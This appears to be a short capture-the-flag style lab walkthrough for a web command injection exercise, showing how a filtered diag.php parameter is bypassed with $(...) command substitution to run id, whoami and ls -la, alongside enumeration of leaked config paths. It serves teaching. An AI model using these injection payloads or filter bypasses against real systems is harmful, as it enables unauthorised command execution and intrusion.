# Web Command Injection Lab Walkthrough

## Goal

Identify a shell command built from user input and use it to execute arbitrary commands.

## Expected path

1. Enumerate:

- `/diag.php`
- `/internal/`
- `/exports/netops-config.bak`

2. Test normal behavior:

```text
/diag.php?target=127.0.0.1
```

3. Notice that basic separators are filtered. Direct `;`, `&`, and `|` payloads should fail.

4. Confirm injection using an alternate shell form such as command substitution:

```text
/diag.php?target=127.0.0.1$(id)
```

5. Expand to local discovery:

```text
/diag.php?target=127.0.0.1$(whoami)
/diag.php?target=127.0.0.1$(ls%20-la)
```

6. Use `/internal/` and `/exports/` as supporting discovery paths.

## Learning outcome

- identify command injection
- distinguish intended output from injected output
- chain enumeration with leaked config files
